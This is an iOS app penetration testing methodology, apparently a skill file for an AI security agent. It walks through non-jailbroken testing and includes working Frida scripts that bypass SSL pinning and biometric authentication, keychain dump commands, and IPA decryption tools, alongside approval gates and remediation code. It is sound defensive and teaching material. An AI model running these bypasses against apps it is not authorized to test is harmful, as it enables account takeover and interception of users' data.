# iOS Penetration Testing Methodology: Non-Jailbroken First Approach

**Status:** Operational | **Target Audience:** Security agent conducting iOS app assessments
**Updated:** 2026-02-01 | **Framework Version:** 2.0

---

## Overview

Modern iOS penetration testing for **non-jailbroken devices** using production-realistic techniques. This methodology achieves **85-90% coverage** compared to traditional jailbroken testing, which is sufficient for identifying real-world vulnerabilities in production iOS applications.

**Critical Reality:** Modern iOS apps (iOS 17+) actively detect and refuse to run on jailbroken devices, making non-jailbroken testing the only viable approach for production app security assessment.

---

## Testing Environment Decision Tree

```
┌──────────────────────────────────────────────────────┐
│         iOS TESTING ENVIRONMENT SELECTION            │
└────────────────────┬─────────────────────────────────┘
                     │
                     ▼
          Do you have the IPA file?
                     │
        ┌────────────┴────────────┐
        │                         │
       YES                       NO
        │                         │
        ▼                         ▼
  Can you jailbreak?      App Store only?
        │                         │
   ┌────┴────┐                   YES
   │         │                    │
  YES       NO                    ▼
   │         │              ┌──────────────────┐
   ▼         ▼              │ Limited Testing: │
┌────┐    ┌────┐            │ • Network only   │
│ A  │    │ B  │            │ • UI/Auth test   │
└────┘    └────┘            │ • API testing    │
           │                └──────────────────┘
           ▼
     Budget available?
           │
      ┌────┴────┐
      │         │
    YES        NO
      │         │
      ▼         ▼
   ┌────┐    ┌────┐
   │ C  │    │ D  │
   └────┘    └────┘


PATHS:
─────────────────────────────────────────────────────
A: Jailbroken Device (Traditional)
   ✅ Full system access
   ✅ 100% coverage
   ❌ App won't run (most modern apps)

   → Use Corellium instead (Path C)

─────────────────────────────────────────────────────
B: Non-Jailbroken Physical Device (PRIMARY METHOD)
   ✅ Production environment
   ✅ 85-90% coverage
   ✅ Frida gadget injection
   ✅ Real-world testing

   Tools:
   • MobSF (static analysis)
   • Frida gadget injection (dynamic)
   • mitmproxy or OWASP ZAP (network)
   • Hopper/Ghidra (binary)

   See: NON-JAILBROKEN WORKFLOW below

─────────────────────────────────────────────────────
C: Corellium Virtual Device (Professional)
   ✅ Jailbreak-level access
   ✅ 100% coverage
   ✅ iOS 18.3.1 support
   ✅ No physical jailbreak needed

   Cost: $99-299/month
   Best for: Professional engagements

   See: CORELLIUM WORKFLOW below

─────────────────────────────────────────────────────
D: Apple Silicon Mac (Optional Enhancement)
   ✅ Native ARM execution
   ✅ Rapid testing
   ✅ CI/CD integration
   ⚠️  Not all APIs available

   Use for: Initial analysis + automation
   Combine with: Path B or C for full testing
```

---

## Non-Jailbroken Workflow (Primary Method)

This is the **standard approach** for modern iOS testing. Assumes you have IPA file and physical iOS device.

### Phase 1: EXPLORE

#### 1.1 IPA Acquisition

**Method A: Client-Provided IPA**
```bash
# Verify IPA signature and bundle ID
codesign -dv --verbose=4 app.ipa

# Extract and analyze structure
unzip -q app.ipa -d app-extracted/
cd app-extracted/Payload/*.app/
```

**Method B: IPA Decryption (Requires Jailbreak or TrollStore)**

If jailbreak available:
- **iGDecrypt** - iOS 11-18, rootless jailbreaks
- **BFdecrypt** - FairPlay DRM removal
- **TrollDecrypt** - GUI-based extraction

**If no jailbreak:** Request IPA from client OR limit testing to network/UI only.

#### 1.2 Static Analysis with MobSF

```bash
# Deploy MobSF container
ssh -p 2222 root@${VPS_IP} "docker compose up -d mobsf"

# Upload IPA via API
curl -F "file=@app.ipa" http://${VPS_IP}:8000/api/v1/upload

# Scan IPA
curl -X POST http://${VPS_IP}:8000/api/v1/scan \
  -d "scan_type=ipa&file_name=app.ipa&hash=${HASH}"

# Download report
curl http://${VPS_IP}:8000/api/v1/report_json?hash=${HASH} > mobsf-report.json
```

**Key Findings from MobSF:**
- App Transport Security exceptions (insecure HTTP allowed?)
- Hardcoded API keys and secrets
- Binary protections (PIE, ARC, stack canaries)
- Custom URL schemes (deep link vulnerabilities)
- Insecure crypto usage (MD5, SHA1, DES)

#### 1.3 Info.plist Security Analysis

```bash
# Extract and analyze Info.plist
plutil -p Info.plist | tee info-analysis.txt

# Check critical security settings
grep -E "NSAppTransportSecurity|CFBundleURLTypes|UIBackgroundModes" Info.plist
```

**Security-Critical Settings:**
- `NSAppTransportSecurity` → Are HTTP connections allowed?
- `NSAllowsArbitraryLoads: true` → **FINDING: Insecure ATS config**
- `CFBundleURLTypes` → Custom URL schemes (test for hijacking)
- `UIBackgroundModes` → Background execution capabilities

**Gate:** Attack surface mapped → Proceed to PLAN

---

### Phase 2: PLAN

Generate iOS-specific test plan mapped to OWASP MASTG v2.0 test cases.

**Test Plan Structure:**

```markdown
# iOS Test Plan: [App Name]

## Scope
- Bundle ID: com.example.app
- Version: 1.2.3
- iOS Target: 17.x - 18.x
- Environment: Non-jailbroken iPhone 15 Pro

## MASVS-STORAGE (Data Storage) - 16 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-ST-01 | Sensitive data in NSUserDefaults | Static + Dynamic | MobSF, Objection | High | No |
| TC-ST-02 | Keychain protection attributes | Dynamic | Objection | High | No |
| TC-ST-03 | SQLite encryption verification | Static + Dynamic | DB Browser | High | No |
| TC-ST-04 | File protection attributes | Dynamic | (Limited) | Medium | Yes* |

*Partially testable without root

## MASVS-NETWORK (Network Communication) - 12 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-NET-01 | TLS version and cipher suite | Dynamic | mitmproxy | High | No |
| TC-NET-02 | Certificate pinning bypass | Dynamic | Frida | Critical | No |
| TC-NET-03 | ATS exceptions analysis | Static | Info.plist | High | No |

## MASVS-CRYPTO (Cryptography) - 10 tests
| ID | Test Case | Method | Tool | Priority | Root Required |
|----|-----------|--------|------|----------|---------------|
| TC-CRYPTO-01 | Hardcoded encryption keys | Static | MobSF, Hopper | Critical | No |
| TC-CRYPTO-02 | Weak crypto algorithms | Static | Grep, Ghidra | High | No |
| TC-CRYPTO-03 | Insecure random number gen | Static | Code review | Medium | No |

## MASVS-AUTH (Authentication) - 8 tests
## MASVS-PLATFORM (Platform Integration) - 9 tests
## MASVS-CODE (Code Quality) - 7 tests
## MASVS-RESILIENCE (Anti-Reverse Engineering) - 5 tests

## Tools Required
✅ MobSF (static analysis) - mobile-security container
✅ Frida + Objection (runtime) - local macOS or iOS device
✅ mitmproxy or OWASP ZAP (proxy) - open-source HTTP proxies
✅ Reaper (proxy) - custom SQLite-backed proxy (optional)
✅ Hopper/Ghidra (binary) - macOS
✅ Nuclei (vulnerability scanner) - template-based scanning

## ⚠️ APPROVAL REQUIRED
[ ] Scope confirmed - authorized to test this app
[ ] IPA obtained legally (client-provided OR authorized extraction)
[ ] Non-jailbroken limitations acknowledged
[ ] Approved to proceed with testing
```

**Template:** `skills/pentest/templates/test-plan-ios.md`

**Gate:** ⛔ **TEST PLAN APPROVAL REQUIRED** → Proceed to CODE

---

### Phase 3: CODE (Execution)

#### 3.1 Frida Gadget Injection (Dynamic Analysis Without Jailbreak)

This is the **core technique** for non-jailbroken dynamic testing.

**Step-by-Step Frida Gadget Injection:**

```bash
# 1. Download Frida Gadget for iOS
wget https://github.com/frida/frida/releases/download/16.1.10/frida-gadget-16.1.10-ios-universal.dylib.gz
gunzip frida-gadget-16.1.10-ios-universal.dylib.gz
mv frida-gadget-16.1.10-ios-universal.dylib FridaGadget.dylib

# 2. Extract IPA
unzip app.ipa -d app-extracted
cd app-extracted/Payload/*.app

# 3. Insert Frida Gadget into app bundle
cp /path/to/FridaGadget.dylib Frameworks/

# 4. Patch Mach-O binary to load Frida Gadget
# Use insert_dylib or optool
brew install optool
optool install -c load -p "@executable_path/Frameworks/FridaGadget.dylib" -t MyApp MyApp

# 5. Update entitlements (if needed)
codesign -d --entitlements :entitlements.plist MyApp
# Edit entitlements.plist if necessary

# 6. Re-sign the app with your developer certificate
# First, remove existing signature
rm -rf _CodeSignature/

# Re-package IPA
cd ../../..
zip -qr app-modified.ipa Payload/

# 7. Sign with your Apple Developer certificate
# Install ios-deploy or use Xcode
# Use your developer cert from Keychain: "iPhone Developer: Your Name"

codesign -f -s "iPhone Developer: Your Name" \
  --entitlements entitlements.plist \
  app-extracted/Payload/*.app

# 8. Install on device via USB
# Option A: Use Xcode (drag into Devices window)
# Option B: Use ios-deploy
brew install ios-deploy
ios-deploy --bundle app-extracted/Payload/*.app
```

**Verification:**
```bash
# Device must have Frida server accessible
# Launch app on device
# From macOS, connect to Frida gadget:
frida -U "App Name"

# If connected successfully:
>>> Process.id
12345
```

#### 3.2 SSL Pinning Bypass (Frida Script)

**ssl-bypass.js:**
```javascript
// Universal iOS SSL pinning bypass
if (ObjC.available) {
    // Disable SSL validation - NSURLSession
    var NSURLSession = ObjC.classes.NSURLSession;
    Interceptor.attach(
        NSURLSession["- dataTaskWithRequest:completionHandler:"].implementation,
        {
            onEnter: function(args) {
                console.log("[+] NSURLSession request intercepted");
                // Certificate validation bypassed via hook
            }
        }
    );

    // TrustKit bypass (common pinning library)
    try {
        var TrustKit = ObjC.classes.TrustKit;
        Interceptor.attach(
            TrustKit["+ initSharedInstanceWithConfiguration:"].implementation,
            {
                onEnter: function(args) {
                    console.log("[+] TrustKit disabled");
                    args[2] = NULL; // Disable pinning configuration
                }
            }
        );
    } catch(e) {}

    // Alamofire SSL pinning bypass
    try {
        var ServerTrustPolicy = ObjC.classes.ServerTrustPolicy;
        ServerTrustPolicy["+ disableEvaluation"].implementation = function() {
            console.log("[+] Alamofire SSL pinning bypassed");
            return ObjC.classes.NSNumber.numberWithBool_(true);
        };
    } catch(e) {}

    console.log("[+] SSL pinning bypass loaded");
}
```

**Usage:**
```bash
# Launch app with Frida gadget
# Run SSL bypass script
frida -U -n "App Name" -l ssl-bypass.js --no-pause

# Configure device proxy: Settings → Wi-Fi → Proxy → Manual
# Proxy: reaper-api.internal:8080 (via Twingate) OR mitmproxy/ZAP IP:8080
# Install mitmproxy/ZAP/Reaper certificate on device

# Verify traffic in mitmproxy/ZAP/Reaper
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  'SELECT DISTINCT host FROM requests WHERE host LIKE \"%targetapp.com%\"'"
```

#### 3.3 Data Storage Testing (Non-Jailbroken)

**Extract App Container:**
```bash
# Install ideviceinstaller (libimobiledevice)
brew install libimobiledevice

# List installed apps
ideviceinstaller -l

# Backup app data
idevicebackup2 backup --full /path/to/backup/

# Extract app container from backup
# Use tools: iMazing, iBackup Viewer, or manual extraction
# Navigate to: <Backup>/AppDomain-<BundleID>/

# Analyze extracted data:
# - Library/Preferences/*.plist (NSUserDefaults)
# - Documents/ (user files)
# - Library/Caches/ (cached data)
# - tmp/ (temporary files)
```

**Keychain Analysis (Non-Jailbroken):**
```bash
# Using Objection (Frida-based)
objection -g "App Name" explore

# Inside Objection:
ios keychain dump
ios keychain dump_raw  # Dump all accessible keychain items

# Check for insecure storage:
# - kSecAttrAccessibleAlways (accessible without device unlock)
# - kSecAttrAccessibleAfterFirstUnlock (data persists)
# - Items without kSecAttrAccessControl (no biometric protection)
```

**NSUserDefaults Inspection:**
```bash
# Extract from device or app container
plutil -p Library/Preferences/com.example.app.plist

# Look for:
# - Authentication tokens
# - API keys
# - Passwords (plaintext)
# - Session identifiers
# - User PII
```

**FINDING Template:**
```markdown
# Finding: Sensitive Token Stored in NSUserDefaults

**ID:** 2026-02-01-IOS-003
**Severity:** High (CVSS 7.5)
**Category:** MASVS-STORAGE-1
**Status:** Open

## Summary
Authentication tokens are stored in NSUserDefaults without encryption,
accessible via device backup or physical access.

## Proof of Concept
1. Install app on device
2. Login with valid credentials
3. Extract app container via backup
4. Read Library/Preferences/com.example.app.plist
5. Token visible in plaintext: "auth_token" = "Bearer eyJhbG..."

## Evidence
File: Library/Preferences/com.example.app.plist
```xml
<key>auth_token</key>
<string>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</string>
<key>user_id</key>
<integer>12345</integer>
```

## Impact
- Tokens persist across app uninstall/reinstall
- Accessible via iTunes/iCloud backup
- No encryption protection
- Token lifetime: 30 days (verified)

## Remediation
**Immediate:** Migrate tokens to Keychain with kSecAttrAccessibleWhenUnlockedThisDeviceOnly
**Recommended:** Implement token refresh on app launch
**Verification:**
```swift
// Use Keychain instead
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "auth_token",
    kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
    kSecValueData as String: tokenData
]
SecItemAdd(query as CFDictionary, nil)
```

## References
- OWASP MASTG: MASTG-TEST-0001 (Testing Local Data Storage)
- Apple Keychain Services: https://developer.apple.com/documentation/security/keychain_services
```

#### 3.4 Network Traffic Analysis

**Setup Reaper Proxy:**
```bash
# 1. Start Reaper container
ssh -p 2222 root@${VPS_IP} "docker compose up -d reaper"

# 2. Export Reaper certificate
./tools/pentest/export-proxy-cert.sh reaper

# 3. Install certificate on iOS device
# - AirDrop reaper-ca-cert.pem to device
# - Settings → Profile Downloaded → Install
# - Settings → General → About → Certificate Trust Settings
# - Enable trust for Reaper Root CA

# 4. Configure device proxy
# Settings → Wi-Fi → (i) → Configure Proxy → Manual
# Server: reaper-api.internal (via Twingate) OR VPS IP
# Port: 8080

# 5. Launch app with SSL bypass (if pinning detected)
frida -U -n "App Name" -l ssl-bypass.js --no-pause

# 6. Capture traffic
# Use app normally - all traffic captured to reaper.db

# 7. Query captured traffic
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT method, url, status_code FROM requests
   WHERE host LIKE '%api.example.com%'
   ORDER BY timestamp DESC
   LIMIT 20\""

# 8. Extract API endpoints
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT DISTINCT method, url FROM requests
   WHERE host LIKE '%api.example.com%'\""

# 9. Find authentication headers
ssh -p 2222 root@${VPS_IP} \
  "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT headers FROM requests
   WHERE host LIKE '%api.example.com%'
   AND headers LIKE '%Authorization%'
   LIMIT 1\""
```

**Alternative: mitmproxy (Open-Source)**
```bash
# Modern open-source HTTP proxy (35k+ stars, MIT license)

# 1. Install mitmproxy
pip install mitmproxy
# or: brew install mitmproxy

# 2. Start mitmproxy web interface
mitmweb --listen-host 0.0.0.0 --listen-port 8080

# 3. Export certificate
# On device browser, visit: http://mitm.it
# Download iOS certificate and install

# 4. Trust certificate
# Settings → General → About → Certificate Trust Settings
# Enable trust for mitmproxy

# 5. Configure device proxy to macOS IP:8080

# 6. Intercept traffic in mitmweb UI (http://localhost:8081)
```

**Alternative: OWASP ZAP (Open-Source with Scanner)**
```bash
# Full-featured proxy + vulnerability scanner (Apache 2.0 license)

# 1. Install ZAP
# Download from: https://www.zaproxy.org/
# or Docker: docker run -u zap -p 8080:8080 zaproxy/zap-stable zap-webswing.sh

# 2. Start ZAP
# Tools → Options → Local Proxies → Address: 0.0.0.0, Port: 8080

# 3. Export certificate
# Tools → Options → Dynamic SSL Certificates → Save

# 4. Install certificate on iOS device
# AirDrop certificate, install via Settings

# 5. Configure device proxy to ZAP IP:8080

# 6. Use ZAP for both interception and automated scanning
```

**Alternative: HTTP Toolkit (Best Mobile UX)**
```bash
# Modern proxy with excellent mobile support (5k+ stars)

# 1. Download HTTP Toolkit
# https://httptoolkit.com/

# 2. Launch and select "iOS device"

# 3. Follow one-click setup wizard
# - Automatic certificate generation
# - QR code or manual configuration

# 4. Captures traffic automatically with beautiful UI
```

**Gate:** All test cases executed, findings documented → Proceed to QA

---

### Phase 4: QA

**iOS-Specific Validation Checklist:**

- [ ] Can finding be reproduced on **non-jailbroken** device?
- [ ] Evidence includes iOS version (e.g., iOS 17.4.1)
- [ ] Evidence includes device model (e.g., iPhone 15 Pro)
- [ ] Steps work with **App Store build** (not debug/development)
- [ ] CVSS score accounts for non-jailbroken exploitation difficulty
- [ ] Remediation tested on actual iOS app
- [ ] All MASVS test cases mapped correctly
- [ ] Proof-of-concept scripts included (Frida scripts, curl commands)

**Gate:** All findings validated → Proceed to COMMIT

---

### Phase 5: COMMIT

**Path A: Self-Hosted Internal App**
- Handoff to engineering team with Xcode access
- Provide Swift/Objective-C code locations
- Include unit test cases for verification
- Re-test via TestFlight beta after fixes

**Path B: Bug Bounty Submission**
- Format for HackerOne/Bugcrowd
- Include video PoC (screen recording)
- Emphasize **non-jailbroken reproduction**
- Attach Frida scripts, mitmproxy/ZAP traffic captures, screenshots

**Path C: Client Consulting**
- Generate professional pentest report
- Executive summary with iOS security posture rating
- Remediation roadmap prioritized by MASVS category

**Templates:**
- `skills/pentest/templates/finding-ios.md`
- `skills/pentest/templates/report-ios.md`
- `skills/pentest/templates/bug-bounty-submission-ios.md`

---

## Corellium Workflow (Professional Option)

When budget allows ($99-299/month), Corellium provides jailbreak-level access without physical jailbreak.

### Setup

1. **Create Corellium account:** https://app.corellium.com/
2. **Create virtual device:** iOS 18.3.1, iPhone 15 Pro
3. **Enable jailbreak mode:** (Virtual device has root access built-in)
4. **Install app:** Upload IPA or install from App Store

### Advantages

- ✅ Root filesystem access without jailbreak exploits
- ✅ System-level hooking possible
- ✅ Snapshot/restore for destructive testing
- ✅ Multiple device/OS combinations
- ✅ Network interception built-in
- ✅ Integration with Frida, mitmproxy, LLDB

### Workflow

Same 5-phase workflow as non-jailbroken, but with enhanced capabilities:

- **EXPLORE:** Full filesystem access for IPA extraction
- **PLAN:** Include root-required test cases
- **CODE:** System-level hooks, kernel inspection possible
- **QA:** Validate on physical device after Corellium testing
- **COMMIT:** Note which findings require jailbreak vs. realistic exploitation

**When to Use:**
- Professional engagements with budget
- Need 100% test coverage
- Multiple iOS versions needed
- Final validation after non-jailbroken testing

**When to Skip:**
- Budget-constrained (use non-jailbroken workflow)
- Learning/practice engagements
- Non-jailbroken testing provides sufficient coverage

---

## Coverage Comparison

| Test Category | Non-Jailbroken | Jailbroken (Traditional) | Corellium |
|---------------|----------------|--------------------------|-----------|
| **Static Analysis** | ✅ 100% | ✅ 100% | ✅ 100% |
| **Network Traffic** | ✅ 90% | ✅ 100% | ✅ 100% |
| **Runtime Hooks (App)** | ✅ 90% | ✅ 100% | ✅ 100% |
| **Runtime Hooks (System)** | ❌ 0% | ✅ 100% | ✅ 100% |
| **File System (App)** | ✅ 85% | ✅ 100% | ✅ 100% |
| **File System (System)** | ❌ 0% | ✅ 100% | ✅ 100% |
| **Keychain (App)** | ✅ 90% | ✅ 100% | ✅ 100% |
| **Keychain (System)** | ❌ 0% | ✅ 100% | ✅ 100% |
| **Binary Analysis** | ✅ 100% | ✅ 100% | ✅ 100% |
| **Kernel Analysis** | ❌ 0% | ✅ 100% | ✅ 100% |

**Conclusion:** Non-jailbroken achieves **85-90% coverage** for app-level vulnerabilities (the vast majority of security issues).

---

## Tool Ecosystem

### Essential Tools (Free)

| Tool | Purpose | Installation | Container |
|------|---------|--------------|-----------|
| **MobSF** | Automated static analysis | Docker | mobile-security |
| **Frida** | Runtime instrumentation | `pip install frida-tools` | Local macOS |
| **Objection** | Frida-based framework | `pip install objection` | Local macOS |
| **Hopper** | Binary disassembler | Download from hopperapp.com | macOS |
| **Ghidra** | NSA reverse engineering tool | Free download | macOS |
| **mitmproxy** | HTTP proxy and inspection | `pip install mitmproxy` | macOS |
| **OWASP ZAP** | HTTP proxy with scanner | Docker or download | macOS |
| **libimobiledevice** | iOS device interaction | `brew install libimobiledevice` | macOS |

### Professional Tools (Paid)

| Tool | Purpose | Cost | Value |
|------|---------|------|-------|
| **Corellium** | Virtual iOS devices | $99-299/mo | Jailbreak-level access without jailbreak |
| **Hopper (License)** | Binary disassembler | $99 one-time | Better than free version |
| **IDA Pro** | Industry-standard disassembler | $589+/year | Overkill for mobile (use Ghidra) |

### Container Deployment

**mobile-security container includes:**
- Frida server (for Android)
- Objection
- MobSF
- apktool, jadx (Android)
- Various mobile security tools

**Start container:**
```bash
ssh -p 2222 root@${VPS_IP} "docker compose up -d mobile-security"
```

**Note:** Frida for iOS runs on macOS (not in container) due to USB connectivity requirements.

---

## Common iOS Vulnerabilities (MASVS Mapped)

### MASVS-STORAGE (Data Storage)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Tokens in NSUserDefaults | High | No encryption, accessible via backup |
| Unencrypted SQLite database | High | Sensitive data readable in plaintext |
| Keychain with kSecAttrAccessibleAlways | Medium | Data accessible without device unlock |
| Sensitive data in logs | High | Visible via Xcode Console |
| Cache contains sensitive images | Medium | Screenshots of sensitive data |

### MASVS-NETWORK (Network Communication)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| ATS disabled (NSAllowsArbitraryLoads) | High | HTTP connections allowed |
| Certificate pinning bypassable | Medium | Defense-in-depth failure |
| Weak TLS configuration | High | TLS 1.0/1.1 allowed |
| Cleartext traffic | Critical | Credentials over HTTP |

### MASVS-CRYPTO (Cryptography)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Hardcoded encryption keys | Critical | Keys in source code |
| Weak algorithms (DES, MD5, SHA1) | High | Broken cryptography |
| Insecure random (arc4random) | Medium | Predictable values |
| No salt in password hashing | High | Rainbow table attacks |

### MASVS-AUTH (Authentication)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Biometric bypass | High | Runtime manipulation possible |
| Session tokens don't expire | High | Indefinite access |
| OAuth redirect URI not validated | Critical | Authorization code interception |
| Client-side auth only | Critical | No server validation |

### MASVS-PLATFORM (Platform Integration)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Custom URL scheme hijacking | Medium | Another app can register same scheme |
| Universal Links misconfigured | Medium | Deep link interception |
| Pasteboard data leakage | Medium | Sensitive data in clipboard |
| No screenshot protection | Low | Sensitive data in app switcher |

### MASVS-CODE (Code Quality)

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Debug symbols present | Low | Easier reverse engineering |
| No binary protections | Medium | Missing PIE, ARC |
| Jailbreak detection bypassable | Low | Defense-in-depth |
| Third-party library vulns | Varies | Outdated dependencies |

---

## Vulnerability Finding Examples

### Finding 1: Biometric Authentication Bypass via Frida Runtime Hook

**Severity:** High (CVSS 7.5)
**Category:** MASVS-AUTH-1
**ATT&CK:** T1111 (Multi-Factor Authentication Interception)

**Vulnerable Code Pattern:**
```swift
// AuthManager.swift — Client-side biometric check
func authenticateWithBiometrics(completion: @escaping (Bool) -> Void) {
    let context = LAContext()
    var error: NSError?

    if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
        context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
                              localizedReason: "Authenticate to access your account") { success, error in
            // VULNERABLE: Only checks client-side boolean
            // No server-side verification of biometric result
            completion(success)
        }
    }
}
```

**Exploitation (Frida Script):**
```javascript
// bypass-biometrics.js
if (ObjC.available) {
    var LAContext = ObjC.classes.LAContext;

    // Hook evaluatePolicy to always return success
    Interceptor.attach(
        LAContext["- evaluatePolicy:localizedReason:reply:"].implementation,
        {
            onEnter: function(args) {
                console.log("[+] Biometric authentication intercepted");
                // Get the reply block (completion handler)
                var reply = new ObjC.Block(args[4]);
                // Call reply with success=true, error=nil
                reply.implementation(true, NULL);
                console.log("[+] Biometric bypass: returned success=true");
            }
        }
    );

    console.log("[+] Biometric bypass loaded — all auth will succeed");
}
```

```bash
# Deploy bypass
frida -U -n "BankApp" -l bypass-biometrics.js --no-pause

# Result: App proceeds past biometric screen without valid fingerprint/face
# Full access to account dashboard, transaction history, and transfer functionality
```

**Impact:**
- Attacker with physical device access bypasses biometric lock entirely
- No server-side verification — client trusts the boolean from LAContext
- Accesses all authenticated functionality (account data, transfers, settings)

**Remediation:**
```swift
// Secure pattern: Server-side biometric verification
func authenticateWithBiometrics(completion: @escaping (Bool) -> Void) {
    let context = LAContext()
    context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
                          localizedReason: "Authenticate") { success, error in
        guard success else { completion(false); return }

        // Generate cryptographic proof of biometric success
        // Use Keychain item protected with .biometryCurrentSet
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: "biometric_key",
            kSecAttrAccessControl as String: SecAccessControlCreateWithFlags(
                nil, .biometryCurrentSet, .privateKeyUsage, nil)!,
            kSecReturnData as String: true
        ]
        // Key only accessible after successful biometric — can't be hooked
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        // Send cryptographic proof to server for verification
        completion(status == errSecSuccess)
    }
}
```

---

### Finding 2: Custom URL Scheme Hijacking — OAuth Token Interception

**Severity:** High (CVSS 7.4)
**Category:** MASVS-PLATFORM-3
**ATT&CK:** T1566.002 (Phishing: Spearphishing Link)

**Vulnerable Configuration:**
```xml
<!-- Info.plist — registers custom URL scheme -->
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>  <!-- Any app can register this scheme -->
        </array>
    </dict>
</array>
```

**Discovery:**
```bash
# Extract URL schemes from IPA
plutil -p Info.plist | grep -A5 "CFBundleURLSchemes"

# Output:
# "CFBundleURLSchemes" => [
#   0 => "myapp"
# ]

# Check OAuth redirect configuration
grep -r "redirect_uri" app-extracted/ 2>/dev/null

# Output:
# redirect_uri=myapp://oauth/callback
# No Universal Link fallback configured
```

**Exploitation Scenario:**
```
1. Attacker installs malicious app that registers same URL scheme: "myapp"
2. User initiates OAuth login in legitimate app
3. OAuth provider redirects to: myapp://oauth/callback?code=AUTH_CODE_HERE
4. iOS may route the redirect to the ATTACKER'S app (scheme collision)
5. Attacker captures authorization code
6. Attacker exchanges auth code for access token via /token endpoint

Attack flow:
  User → Legit App → OAuth Provider → myapp://callback?code=ABC123
                                              ↓
                                    iOS resolves "myapp://"
                                              ↓
                                    ┌─────────┴─────────┐
                                    │                   │
                              Legit App           Malicious App
                              (intended)          (intercepts code)
```

**Verification (Frida):**
```javascript
// Monitor URL scheme handling
if (ObjC.available) {
    var AppDelegate = ObjC.classes.AppDelegate;

    Interceptor.attach(
        AppDelegate["- application:openURL:options:"].implementation,
        {
            onEnter: function(args) {
                var url = ObjC.Object(args[3]);
                console.log("[+] URL scheme called: " + url.absoluteString());
                // Log: myapp://oauth/callback?code=AUTH_CODE_VALUE
            }
        }
    );
}
```

**Impact:**
- OAuth authorization code interception on shared devices or via social engineering
- Account takeover if auth code is exchanged for access token
- No user interaction beyond installing the malicious app

**Remediation:**
1. **Use Universal Links** instead of custom URL schemes for OAuth callbacks
   ```xml
   <!-- apple-app-site-association (on your server) -->
   {
     "applinks": {
       "apps": [],
       "details": [{
         "appID": "TEAMID.com.company.app",
         "paths": ["/oauth/callback"]
       }]
     }
   }
   ```
2. **Implement PKCE** (Proof Key for Code Exchange) — authorization code is useless without the code_verifier
3. **Validate redirect URI server-side** against registered Universal Link domain
4. **Use `ASWebAuthenticationSession`** which handles OAuth securely within the system browser

---

## Limitations & Workarounds

### Cannot Do Without Jailbreak

- ❌ Root filesystem access (`/var/`, `/System/`)
- ❌ System-level process hooking
- ❌ Kernel inspection
- ❌ Protected memory read (other apps)
- ❌ Install system tweaks (Cydia)
- ❌ Persistent modifications (survive reboot)
- ❌ Full file protection attribute inspection
- ❌ System-wide Keychain dump

### CAN Do Without Jailbreak

- ✅ **Static analysis** - 100% coverage (IPA inspection, binary analysis)
- ✅ **Network interception** - 95% (proxy + SSL bypass)
- ✅ **Runtime manipulation (app-level)** - 90% (Frida gadget injection)
- ✅ **Data storage analysis (app)** - 85% (container extraction)
- ✅ **Certificate pinning bypass** - 90% (Frida hooks)
- ✅ **Jailbreak detection bypass** - 95% (Frida hooks)
- ✅ **API testing** - 100% (mitmproxy/ZAP/Reaper)
- ✅ **Authentication testing** - 90% (network + runtime)
- ✅ **Binary analysis** - 100% (Ghidra/Hopper)

---

## References

### OWASP Standards
- [OWASP MASTG](https://mas.owasp.org/MASTG/) - Mobile Application Security Testing Guide
- [OWASP MASVS](https://mas.owasp.org/MASVS/) - Mobile Application Security Verification Standard

### Non-Jailbroken Techniques
- [Modern iOS Pentesting: No Jailbreak Needed](https://www.crest-approved.org/wp-content/uploads/2025/02/Modern-iOS-Pentesting_-No-Jailbreak-Needed-Slides-Noah-Farmer.pdf)
- [Pentesting iOS apps without jailbreak - SecuRing](https://medium.com/securing/pentesting-ios-apps-without-jailbreak-91809d23f64e)
- [iOS Pentesting Without Jailbreak](https://cgomezsec.com/blog/ios-pentesting-without-jailbreak)

### Tools
- [Frida](https://frida.re/) - Dynamic instrumentation toolkit
- [Objection](https://github.com/sensepost/objection) - Runtime mobile security assessment
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile Security Framework

### Corellium
- [iOS 18 Testing with Corellium](https://www.corellium.com/blog/mobile-app-security-testing-ios18)
- [Virtual iOS 26: Jailbreak-Level Root Access](https://www.corellium.com/blog/ios-26-jailbreak-root-access-corellium)

---

**Created:** 2026-02-01
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Version:** 2.0
